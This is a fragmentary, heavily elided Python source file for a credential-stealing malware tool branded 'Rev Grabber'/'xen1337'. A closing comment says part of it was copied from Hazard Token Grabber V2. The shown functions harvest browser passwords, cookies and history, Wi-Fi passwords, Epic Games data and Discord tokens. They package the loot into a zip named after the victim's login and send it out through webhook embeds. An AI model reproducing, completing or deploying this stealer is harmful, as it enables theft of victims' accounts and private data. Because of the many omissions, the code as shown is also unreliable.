    ...
    def file_tree(self, path):
        ...
        for dirpath, dirnames, filenames in os.walk(path):
            ...
            for n, f in enumerate(filenames):
                ...
                if f == f'Xen-Logged-{os.getlogin()}.zip':
                    continue
...
class xen(functions):
    ...
    def browserinfo(self, platform, path):
        p_header = f"Rev Grabber Passwords\nBrowser:{platform}\n\n"
        c_header = f"Rev Grabber Cookies\nBrowser:{platform}\n\n\n"
        h_header = f"Rev Grabber History\nBrowser:{platform}\n\n"
        m_header = f"Rev Grabber Other Info\nBrowser:{platform}\n\n"
        b_header = f"Rev Grabber Bookmarks\nBrowser:{platform}\n\n"
        e_header = f"Rev Grabber Extensions\nBrowser:{platform}\n\n"
        d_header = f"Rev Grabber Download History\nBrowser:{platform}\n\n"
    ...
    def grabwifi(self):
        ...
        for i in profiles:
            ...
            with open(self.dir+"\\Wifi passwords.txt","w") as f:
                f.write(f"Rev Grabber wifi passwords\n\nWi-Fi Name                    | Password\n------------------------------------------\n")
                ...
                for line in f.readlines():
                    if line.startswith("Data="):
                        with open(os.path.join(self.dir, "Epic games data.txt"), 'w', encoding="cp437") as g:
                            g.write(
                                f"Rev Grabber Epic Games Offline Data\n\n")
            ...
            for token in self.tokens:
                ...
                if res.status_code == 200:
                    ...
                    if not user_name in username:
                        ...
                        embed = {
                            "username": f"Discord Info | xen1337",
                            "avatar_url": "https://i.hizliresim.com/6t31tw2.jpg",
                            "embeds": [
                                {
                                    "author": {
                                        "name": "xen/revshit#1337",
                                        "url": "https://youtube.com/@xen3117",
    ...
    def sysinfo(self):
        ...
        try:
            ...
            self.exceptions.append(traceback.format_exc())
        embed = {
            "username": f"System Info | xen1337",
            "avatar_url": "https://i.imgur.com/bbWgtHI.png",
            "title": "__System Info__",
            "embeds": [
                     {
                         "author": {
                             "name": "xen/revshit#1337",
    ...
    def upload(self):
        name = os.getlogin()
        _zipfile = os.path.join(self.dir, f'Xen-Logged-{os.getlogin()}.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                if filename == f'Xen-Logged-{os.getlogin()}.zip':
                    continue
        ...
        if config.get('Ping_on_run'):
            ...
            content = ""
        embed = {
            "username": f"{name} | xen1337",
            "content": content,
            "avatar_url": "https://i.imgur.com/bbWgtHI.png",
            "title": "__discord.gg/revshit__",
            "embeds": [
                     {
                         "author": {
                             "name": "xen/revshit#1337",
...
# ETONG PART NATU KINUHA KO LNG TO SA HAZARD TOKEN GRABBER V2 LABYOUU MWAMWAMWA!
